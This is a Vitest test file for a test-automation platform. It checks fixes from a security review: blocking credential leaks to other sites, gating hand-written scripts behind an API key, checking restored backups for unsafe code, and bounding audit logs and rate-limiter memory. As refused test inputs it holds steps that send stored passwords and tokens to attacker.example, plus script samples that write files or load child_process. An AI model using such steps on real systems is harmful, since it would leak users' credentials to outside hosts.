/**
 * Round 13, part AZ1: fixes for the independent security review (AX), browser-free.
 *   H1  the routes refuse a test that sends stored sign-in details to another site (import, step editor save and preview)
 *   M2  ALLOW_CUSTOM_SCRIPTS without an API_KEY is not in force, and says so
 *   M8  a restore checks every script and every version of a hand-written test; duplicate versions are a plain 400
 *   L4  only Playwright tests can be taken over
 *   L6  audit trails and script history are bounded
 *   L7  the rate limiter's memory is bounded
 *   M1  a Git import has a budget for the safety check and gives the server a breath
 * Ports: none (the application address is never contacted; Git uses a local repository).
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { strFromU8, strToU8, unzipSync, zipSync } from "fflate";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { CUSTOM_SCRIPTS_NEEDS_API_KEY, loadConfig } from "../src/config.js";
import { checkScript } from "../src/engine/custom/guard.js";
import { RateLimiter } from "../src/platform/agent-routing.js";
import { bootstrap, type Platform } from "../src/platform/bootstrap.js";
import { CustomScriptStore, KEEP_AUDIT_ROWS, MAX_PROJECT_VERSION_BYTES } from "../src/platform/custom-script-store.js";
import { DEFAULT_JOB_OPTIONS } from "../src/platform/repo.js";
import { GUARD_BUDGET_BYTES, GitImportService, type GitImportPorts } from "../src/platform/git-import-service.js";
import { KEEP_LIVE_AUDIT_ROWS, LiveAuditStore } from "../src/platform/live-session-store.js";
import { buildServer } from "../src/platform/server.js";
import { makeTempRoot, specFile, TestRepo } from "./fixtures/git-fixture.js";

const KEY = "az1-key-0123456789";
const APP = "http://127.0.0.1:6210";
const SECRET = { SECRET_KEY: "test-secret-key-0123456789", CONCURRENCY: "1", MAX_REPAIR_ATTEMPTS: "0", LLM_PROVIDER: "anthropic" };

interface Env {
    platform: Platform;
    server: Awaited<ReturnType<typeof buildServer>>;
    dir: string;
    call(method: "GET" | "POST" | "PUT" | "DELETE", url: string, payload?: unknown): Promise<{ status: number; body: any }>;
    raw(method: "GET" | "POST", url: string, payload?: Buffer, type?: string): Promise<{ status: number; body: string; bytes: Uint8Array }>;
}
const envs: Env[] = [];
async function makeEnv(over: Record<string, string>): Promise<Env> {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "aitp-az1-"));
    const platform = bootstrap(loadConfig({ DATA_DIR: dir, ...SECRET, ...over }));
    const server = await buildServer(platform);
    const headers: Record<string, string> = over.API_KEY ? { "x-api-key": over.API_KEY } : {};
    const e: Env = {
        platform,
        server,
        dir,
        call: async (method, url, payload) => {
            const res = await server.inject({ method, url, payload: payload as never, headers: { ...headers, ...(payload !== undefined ? { "content-type": "application/json" } : {}) } });
            const text = res.body;
            return { status: res.statusCode, body: text && (text.startsWith("{") || text.startsWith("[")) ? JSON.parse(text) : text || null };
        },
        raw: async (method, url, payload, type) => {
            const res = await server.inject({ method, url, payload, headers: { ...headers, ...(type ? { "content-type": type } : {}) } });
            return { status: res.statusCode, body: res.body, bytes: new Uint8Array(res.rawPayload) };
        },
    };
    envs.push(e);
    return e;
}
afterAll(async () => {
    for (const e of envs) {
        await e.server.close();
        e.platform.db.close();
        fs.rmSync(e.dir, { recursive: true, force: true });
    }
});

const typePassword = { action: "fill", locator: { by: "label", value: "Password" }, value: "{{credentials.password}}" };
const webSpec = (title: string, steps: unknown[]) => ({ title, kind: "web", category: "Shop", steps });
const apiSpec = (title: string, steps: unknown[]) => ({ title, kind: "api", category: "API", steps });
const GOOD = `import { test, expect } from "@playwright/test";\ntest("by hand", async ({ page }) => {\n  await page.goto(process.env.BASE_URL + "/");\n  await expect(page).toHaveTitle(/x/);\n});\n`;

// ── H1 through the real routes ───────────────────────────────────────────────
describe("H1: the routes refuse a test that sends stored sign-in details to another site", () => {
    let e: Env;
    let pid = "";
    let webId = "";
    let apiId = "";
    beforeAll(async () => {
        e = await makeEnv({ API_KEY: KEY });
        pid = (await e.call("POST", "/api/projects", { name: "H1" })).body.id;
        const imp = await e.call("POST", `/api/projects/${pid}/specs`, {
            baseUrl: APP,
            validate: false,
            specs: [
                webSpec("Sign in on the shop", [{ action: "navigate", url: "/login" }, typePassword]),
                apiSpec("List the products", [{ action: "request", method: "GET", path: "/api/products" }, { action: "assertResponse", check: "status", expected: 200 }]),
            ],
        });
        expect(imp.status, JSON.stringify(imp.body)).toBe(202);
        webId = imp.body.tests[0].id;
        apiId = imp.body.tests[1].id;
    });

    const testsInProject = async () => ((await e.call("GET", `/api/projects/${pid}/tests`)).body as unknown[]).length;
    const messageOf = (body: any): string => JSON.stringify(body);

    it("import refuses a web step list that types the password on another site, names the step, and stores nothing", async () => {
        const before = await testsInProject();
        const r = await e.call("POST", `/api/projects/${pid}/specs`, { validate: false, specs: [webSpec("Leaks the password", [{ action: "navigate", url: "https://attacker.example/login" }, typePassword])] });
        expect(r.status).toBe(400);
        expect(r.body.error).toBe("Invalid specs");
        expect(r.body.details[0].index).toBe(0);
        expect(r.body.details[0].issues[0].message).toMatch(/^Step 2: Stored sign-in details can only be used on the application's own site/);
        expect(await testsInProject()).toBe(before);
    });

    it("import refuses an API request that would send the stored token to another site (auth is on unless a step says none)", async () => {
        const before = await testsInProject();
        const r = await e.call("POST", `/api/projects/${pid}/specs`, { validate: false, specs: [apiSpec("Sends the token away", [{ action: "request", method: "GET", path: "https://attacker.example/collect" }])] });
        expect(r.status).toBe(400);
        expect(messageOf(r.body)).toMatch(/Step 1: Stored sign-in details can only be used on the application's own site/);
        expect(await testsInProject()).toBe(before);
    });

    it("import accepts the same request when it sends nothing stored, and any address that stays on the application", async () => {
        const r = await e.call("POST", `/api/projects/${pid}/specs`, {
            validate: false,
            specs: [
                apiSpec("A public service, no sign-in", [{ action: "request", method: "GET", path: "https://public.example/status", auth: "none" }]),
                webSpec("Sign in with an absolute address of the same site", [{ action: "navigate", url: `${APP}/login` }, typePassword]),
            ],
        });
        expect(r.status, JSON.stringify(r.body)).toBe(202);
    });

    it("the step editor refuses a save: a plain per-step message, the stored steps and script unchanged", async () => {
        const stored = (await e.call("GET", `/api/tests/${webId}/spec`)).body;
        const script = String((await e.call("GET", `/api/tests/${webId}/script`)).body);
        const edited = { ...stored.spec, steps: [{ action: "navigate", url: "https://attacker.example/login" }, typePassword] };
        const put = await e.call("PUT", `/api/tests/${webId}/spec`, { spec: edited });
        expect(put.status).toBe(422);
        expect(put.body.error).toMatch(/not saved: Step 2: Stored sign-in details can only be used on the application's own site/);
        expect(put.body.diagnostics.find((d: any) => d.stepIndex === 1 && d.severity === "error")).toBeTruthy();
        expect((await e.call("GET", `/api/tests/${webId}/spec`)).body.spec.steps).toEqual(stored.spec.steps);
        expect(String((await e.call("GET", `/api/tests/${webId}/script`)).body)).toBe(script);
    });

    it("the step editor's preview says the same and renders no script", async () => {
        const stored = (await e.call("GET", `/api/tests/${apiId}/spec`)).body;
        const edited = { ...stored.spec, steps: [{ action: "request", method: "POST", path: "https://attacker.example/c", auth: "none", body: { p: "{{credentials.password}}" } }, ...stored.spec.steps.slice(1)] };
        const r = await e.call("POST", `/api/tests/${apiId}/spec/preview`, { spec: edited });
        expect(r.status).toBe(200);
        expect(r.body).toMatchObject({ ok: false, script: null });
        const leak = r.body.diagnostics.find((d: any) => /Stored sign-in details can only be used on the application's own site/.test(d.message));
        expect(leak).toMatchObject({ stepIndex: 0, severity: "error" });
    });

    it("a request to a captured address that would carry the token is refused too", async () => {
        const stored = (await e.call("GET", `/api/tests/${apiId}/spec`)).body;
        const edited = { ...stored.spec, steps: [{ action: "request", method: "GET", path: "{{where}}/x" }, ...stored.spec.steps.slice(1)] };
        const r = await e.call("POST", `/api/tests/${apiId}/spec/preview`, { spec: edited });
        expect(r.body.ok).toBe(false);
        expect(r.body.diagnostics.map((d: any) => d.message).join(" ")).toMatch(/must not start with a \{\{placeholder\}\}/);
    });

    it("a change that stays on the application still saves", async () => {
        const stored = (await e.call("GET", `/api/tests/${webId}/spec`)).body;
        const edited = { ...stored.spec, steps: [{ action: "navigate", url: "/sign-in" }, typePassword] };
        const put = await e.call("PUT", `/api/tests/${webId}/spec`, { spec: edited });
        expect(put.status, JSON.stringify(put.body)).toBe(200);
        expect(put.body.changed).toBe(true);
        expect(String((await e.call("GET", `/api/tests/${webId}/script`)).body)).toContain("assertOwnOrigin(page.url(), BASE_URL);");
    });
});

// ── M2 ───────────────────────────────────────────────────────────────────────
describe("M2: ALLOW_CUSTOM_SCRIPTS without an API_KEY is not in force", () => {
    it("the switch counts only with a key, and the configuration says why when it does not", () => {
        const off = loadConfig({ DATA_DIR: os.tmpdir(), ...SECRET, ALLOW_CUSTOM_SCRIPTS: "true" });
        expect(off.ALLOW_CUSTOM_SCRIPTS).toBe(false);
        expect(off.customScriptsRequested).toBe(true);
        expect(off.customScriptsReason).toBe(CUSTOM_SCRIPTS_NEEDS_API_KEY);
        const on = loadConfig({ DATA_DIR: os.tmpdir(), ...SECRET, ALLOW_CUSTOM_SCRIPTS: "true", API_KEY: "k" });
        expect(on.ALLOW_CUSTOM_SCRIPTS).toBe(true);
        expect(on.customScriptsReason).toBeUndefined();
        const plain = loadConfig({ DATA_DIR: os.tmpdir(), ...SECRET });
        expect(plain.ALLOW_CUSTOM_SCRIPTS).toBe(false);
        expect(plain.customScriptsRequested).toBe(false);
        expect(plain.customScriptsReason).toBeUndefined();
        // an empty line in .env is "not set"
        expect(loadConfig({ DATA_DIR: os.tmpdir(), ...SECRET, ALLOW_CUSTOM_SCRIPTS: "true", API_KEY: "" }).ALLOW_CUSTOM_SCRIPTS).toBe(false);
    });

    it("GET /api/config says platform:false with the reason; with a key it says true and no reason", async () => {
        const keyless = await makeEnv({ ALLOW_CUSTOM_SCRIPTS: "true" });
        const cfg = (await keyless.call("GET", "/api/config")).body;
        expect(cfg.customScripts.platform).toBe(false);
        expect(cfg.customScripts.reason).toBe(CUSTOM_SCRIPTS_NEEDS_API_KEY);
        expect(cfg.customScripts.reason).toMatch(/API_KEY/);
        const keyed = await makeEnv({ ALLOW_CUSTOM_SCRIPTS: "true", API_KEY: KEY });
        const cfg2 = (await keyed.call("GET", "/api/config")).body;
        expect(cfg2.customScripts.platform).toBe(true);
        expect(cfg2.customScripts).not.toHaveProperty("reason");
    });

    it("a run of a hand-written test is refused on a keyless server, with the reason in the sentence; the same server with a key allows it", async () => {
        for (const [over, allowed] of [[{ ALLOW_CUSTOM_SCRIPTS: "true" }, false], [{ ALLOW_CUSTOM_SCRIPTS: "true", API_KEY: KEY }, true]] as const) {
            const e = await makeEnv({ ...over });
            const pid = (await e.call("POST", "/api/projects", { name: "Policy" })).body.id;
            await e.call("POST", `/api/projects/${pid}/specs`, { baseUrl: APP, validate: false, specs: [webSpec("A generated one", [{ action: "navigate", url: "/" }])] });
            const made = await e.call("POST", `/api/projects/${pid}/custom-tests`, { title: "Written by hand", kind: "web", content: GOOD });
            expect(made.status).toBe(201);
            const appId = e.platform.repo.getLatestApplicationPublic(pid)!.id as string;
            const attempt = () => e.platform.repo.createJob(pid, appId, { ...DEFAULT_JOB_OPTIONS, mode: "validate", testIds: [made.body.testId] });
            if (allowed) {
                await expect(attempt()).resolves.toBeDefined();
                expect(made.body.jobId).toBeTruthy();
            } else {
                await expect(attempt()).rejects.toThrow(/this server does not run them.*API_KEY is not set/);
                expect(made.body.jobId).toBeNull();
                expect(made.body.note).toMatch(/API_KEY is not set/);
            }
        }
    });
});

// ── M8, L4 ───────────────────────────────────────────────────────────────────
describe("M8 and L4: restore checks all of a hand-written test, take-over is for Playwright tests only", () => {
    let e: Env;
    let pid = "";
    let customId = "";
    let files: Record<string, Uint8Array>;
    beforeAll(async () => {
        e = await makeEnv({ ALLOW_CUSTOM_SCRIPTS: "true", API_KEY: KEY });
        pid = (await e.call("POST", "/api/projects", { name: "Backup source" })).body.id;
        await e.call("POST", `/api/projects/${pid}/specs`, { baseUrl: APP, validate: false, specs: [webSpec("A generated one", [{ action: "navigate", url: "/" }])] });
        const made = await e.call("POST", `/api/projects/${pid}/custom-tests`, { title: "Written by hand", kind: "web", content: GOOD });
        expect(made.status).toBe(201);
        customId = made.body.testId;
        // a second version, so the history has more than one entry
        const edit = await e.call("PUT", `/api/tests/${customId}/script`, { content: GOOD.replace("by hand", "by hand, edited") });
        expect(edit.status).toBe(200);
        const backup = await e.raw("GET", `/api/projects/${pid}/backup`);
        expect(backup.status).toBe(200);
        files = unzipSync(backup.bytes);
    });

    const restore = async (tamper: (tests: any[]) => void) => {
        const copy = { ...files };
        const tests = JSON.parse(strFromU8(files["tests.json"]!)) as any[];
        tamper(tests);
        copy["tests.json"] = strToU8(JSON.stringify(tests));
        return e.raw("POST", "/api/projects/restore", Buffer.from(zipSync(copy)), "application/zip");
    };
    const custom = (tests: any[]) => tests.find((t) => t.custom)!;

    it("an unchanged backup restores", async () => {
        const r = await restore(() => undefined);
        expect(r.status, r.body).toBe(201);
    });

    it("refuses a backup in which a SECOND runnable script of a hand-written test is dangerous (the first one is fine)", async () => {
        const r = await restore((tests) => custom(tests).scripts.push({ framework: "playwright", filename: "second.spec.ts", content: `import fs from "fs";\nfs.writeFileSync("pwned.txt", "x");\n`, executable: true }));
        expect(r.status).toBe(400);
        expect(r.body).toMatch(/the code test .* does not pass the safety check/);
    });

    it("refuses a backup whose history holds dangerous code in an old version", async () => {
        const r = await restore((tests) => (custom(tests).custom.versions[0].content = `const f = require("child_process");\n`));
        expect(r.status).toBe(400);
        expect(r.body).toMatch(/safety check/);
    });

    it("a backup with two versions of the same number is a plain 400, not a server error", async () => {
        const r = await restore((tests) => {
            const v = custom(tests).custom.versions;
            v[1] = { ...v[1], version: v[0].version };
        });
        expect(r.status).toBe(400);
        expect(r.body).toMatch(/two versions of a hand-written test have the same number/);
    });

    it("refuses a hand-written test whose format is not Playwright", async () => {
        const r = await restore((tests) => (custom(tests).framework = "taqwright"));
        expect(r.status).toBe(400);
        expect(r.body).toMatch(/cannot be hand-written/);
    });

    it("take-over: a Playwright test is allowed, a test of another framework is refused with the reason (nothing changes)", async () => {
        // a project of its own: the hand-written test above queued a validation job here, and a run in progress blocks a take-over
        const fresh = (await e.call("POST", "/api/projects", { name: "Take-over" })).body.id;
        const imp = await e.call("POST", `/api/projects/${fresh}/specs`, { baseUrl: APP, validate: false, specs: [webSpec("Another generated one", [{ action: "navigate", url: "/other" }]), apiSpec("An API one", [{ action: "request", method: "GET", path: "/api/x" }])] });
        const [web, api] = [imp.body.tests[0].id as string, imp.body.tests[1].id as string];
        expect((await e.call("GET", `/api/tests/${api}/take-over`)).body).toMatchObject({ allowed: true });
        expect((await e.call("GET", `/api/tests/${web}/take-over`)).body).toMatchObject({ allowed: true });
        e.platform.db.run("UPDATE test_cases SET framework = 'taqwright' WHERE id = ?", web);
        const info = (await e.call("GET", `/api/tests/${web}/take-over`)).body;
        expect(info).toMatchObject({ allowed: false });
        expect(info.reason).toMatch(/Only tests that run with Playwright/);
        const post = await e.call("POST", `/api/tests/${web}/take-over`, { confirm: true });
        expect(post.status).toBe(409);
        expect(new CustomScriptStore(e.platform.db).isCustom(web)).toBe(false);
    });
});

// ── L6 ───────────────────────────────────────────────────────────────────────
describe("L6: audit trails and script history are bounded", () => {
    let e: Env;
    let p1 = "";
    let p2 = "";
    beforeAll(async () => {
        e = await makeEnv({});
        p1 = (await e.call("POST", "/api/projects", { name: "One" })).body.id;
        p2 = (await e.call("POST", "/api/projects", { name: "Two" })).body.id;
    });

    it("keeps the newest audit rows of a project and leaves another project's alone", () => {
        const store = new CustomScriptStore(e.platform.db, { auditRows: 5 });
        for (let i = 0; i < 12; i++) store.audit(p1, null, "edit", `event ${i}`);
        for (let i = 0; i < 3; i++) store.audit(p2, null, "edit", `other ${i}`);
        const rows = store.auditTrail(p1, 100);
        expect(rows.map((r) => r.detail)).toEqual(["event 11", "event 10", "event 9", "event 8", "event 7"]);
        expect(store.auditTrail(p2, 100)).toHaveLength(3);
    });

    it("the default is the newest thousand", () => {
        const store = new CustomScriptStore(e.platform.db);
        e.platform.db.tx(() => {
            for (let i = 0; i < KEEP_AUDIT_ROWS + 120; i++) store.audit(p2, null, "bulk", `row ${i}`);
        });
        const n = Number(e.platform.db.get<{ n: number }>("SELECT COUNT(*) AS n FROM custom_audit WHERE project_id = ?", p2)!.n);
        expect(n).toBe(KEEP_AUDIT_ROWS);
        expect(store.auditTrail(p2, 1)[0]!.detail).toBe(`row ${KEEP_AUDIT_ROWS + 119}`);
    });

    it("keeps the newest live-session rows of a project", () => {
        const audit = new LiveAuditStore(e.platform.db, 4);
        for (let i = 0; i < 9; i++) audit.count({ recordingId: `rec-${String(i).padStart(2, "0")}`, projectId: p1, startUrl: "http://x.test/", runner: "platform" }, "actions");
        audit.count({ recordingId: "rec-other", projectId: p2, startUrl: "http://x.test/", runner: "platform" }, "snapshots");
        const mine = audit.list(p1, 50);
        expect(mine).toHaveLength(4);
        expect(mine.every((r) => r.recordingId >= "rec-05")).toBe(true);
        // counting a session again updates its row, it does not make another
        audit.count({ recordingId: "rec-08", projectId: p1, startUrl: "http://x.test/", runner: "platform" }, "actions");
        expect(audit.list(p1, 50)).toHaveLength(4);
        expect(audit.list(p1, 50).find((r) => r.recordingId === "rec-08")!.actions).toBe(2);
        expect(audit.list(p2, 50)).toHaveLength(1);
        expect(KEEP_LIVE_AUDIT_ROWS).toBe(1000);
    });

    it("keeps a project's script history under the cap: the oldest versions go, never version 0 and never a test's newest", async () => {
        const pid = (await e.call("POST", "/api/projects", { name: "History" })).body.id;
        await e.call("POST", `/api/projects/${pid}/specs`, { baseUrl: APP, validate: false, specs: [webSpec("First of two", [{ action: "navigate", url: "/a" }]), webSpec("Second of two", [{ action: "navigate", url: "/b" }])] });
        const ids = (e.platform.repo.listTests(pid)).map((t) => t.id);
        const store = new CustomScriptStore(e.platform.db, { projectVersionBytes: 6000 });
        const body = (n: number) => `// version ${n}\n${"x".repeat(1000)}\n`;
        for (const id of ids) {
            store.addVersion(id, { content: body(0), kind: "generated", version: 0 });
            for (let v = 1; v <= 6; v++) store.addVersion(id, { content: body(v) + id, kind: "edited" });
        }
        const total = Number(e.platform.db.get<{ n: number }>("SELECT SUM(LENGTH(CAST(content AS BLOB))) AS n FROM custom_script_versions v JOIN test_cases t ON t.id = v.test_case_id WHERE t.project_id = ?", pid)!.n);
        expect(total).toBeLessThanOrEqual(6000 + 1100); // the cap, and at most the one version that tipped it over is pruned next time
        for (const id of ids) {
            const versions = store.listVersions(id).map((v) => v.version);
            expect(versions).toContain(0);
            expect(versions).toContain(6);
            expect(versions.length).toBeLessThan(7);
        }
        // the default cap is real and generous
        expect(MAX_PROJECT_VERSION_BYTES).toBe(50 * 1024 * 1024);
    });
});

// ── L7 ───────────────────────────────────────────────────────────────────────
describe("L7: the rate limiter's memory is bounded", () => {
    it("never remembers more keys than its cap, however many callers come", () => {
        let now = 1_000_000;
        const rl = new RateLimiter(5, 1000, () => now, 50);
        for (let i = 0; i < 500; i++) rl.take(`10.0.${Math.floor(i / 250)}.${i % 250}`);
        expect(rl.size).toBeLessThanOrEqual(50);
        // the default cap holds for thousands of fresh callers inside one window
        const big = new RateLimiter(5, 60_000, () => now);
        for (let i = 0; i < 6000; i++) big.take(`ip-${i}`);
        expect(big.size).toBeLessThanOrEqual(4096);
        expect(big.size).toBeGreaterThan(4000);
    });

    it("still limits a caller who keeps asking, and forgets callers whose window has passed", () => {
        let now = 5_000;
        const rl = new RateLimiter(2, 1000, () => now, 50);
        expect([rl.take("a"), rl.take("a"), rl.take("a")]).toEqual([true, true, false]);
        for (let i = 0; i < 20; i++) rl.take(`other-${i}`);
        expect(rl.take("a")).toBe(false); // a recently used key is not the one evicted
        now += 1500;
        expect(rl.take("a")).toBe(true);
        expect(rl.size).toBe(1); // everything else expired and was swept
    });
});

// ── M1: a Git import does not hold the server up ────────────────────────────
describe("M1: a Git import has a budget for the safety check", () => {
    let root = "";
    let repo: TestRepo;
    beforeAll(() => {
        root = makeTempRoot("az1-git-");
        repo = new TestRepo(path.join(root, "repo"));
        for (let i = 0; i < 6; i++) repo.write(`tests/t${i}.spec.ts`, specFile(`Case ${i}`, `await page.goto('/${i}');\n    // ${"y".repeat(3000)}`));
        repo.commit("six files of about 3 KB");
    });
    afterAll(() => {
        repo?.destroy();
        fs.rmSync(root, { recursive: true, force: true });
    });
    const ports = (checked: string[], budget?: number): GitImportPorts => ({
        checkScript: (content) => {
            checked.push(content);
            return checkScript(content).diagnostics;
        },
        helperNames: () => [],
        ...(budget !== undefined ? { guardBudgetBytes: budget } : {}),
        repos: { create: (r) => ({ ...r, id: "r1" }), list: () => [], get: () => undefined, update: () => undefined, delete: () => undefined },
        tests: { upsert: async () => ({ testId: "t", created: true, changed: true }), forRepo: () => [], queueValidation: async () => ({ jobId: null }) },
    });

    it("checks files until the budget is used, then lists the rest as left out with a plain reason", async () => {
        const checked: string[] = [];
        const svc = new GitImportService({ scratchRoot: path.join(root, "scratch"), allowLocal: true }, ports(checked, 7000));
        const pre = await svc.dryRun("p1", { url: repo.url, dryRun: true });
        expect(checked.length).toBe(2); // 2 x about 3.1 KB fit in 7000; the third would pass it
        expect(pre.files).toHaveLength(2);
        const left = pre.skipped.filter((s) => /more code than can be checked at once/.test(s.reason));
        expect(left).toHaveLength(4);
        expect(left[0]!.reason).toMatch(/Import a smaller folder/);
    });

    it("the default budget is generous for ordinary test files (all six are checked)", async () => {
        const checked: string[] = [];
        const svc = new GitImportService({ scratchRoot: path.join(root, "scratch"), allowLocal: true }, ports(checked));
        const pre = await svc.dryRun("p1", { url: repo.url, dryRun: true });
        expect(pre.files).toHaveLength(6);
        expect(checked).toHaveLength(6);
        expect(GUARD_BUDGET_BYTES).toBeGreaterThanOrEqual(5_000_000);
    });

    it("lets other work run between files (the event loop is not held for the whole repository)", async () => {
        let ticks = 0;
        const timer = setInterval(() => void ticks++, 1);
        try {
            const checked: string[] = [];
            const svc = new GitImportService({ scratchRoot: path.join(root, "scratch"), allowLocal: true }, ports(checked));
            await svc.dryRun("p1", { url: repo.url, dryRun: true });
        } finally {
            clearInterval(timer);
        }
        expect(ticks).toBeGreaterThan(0);
    });
});
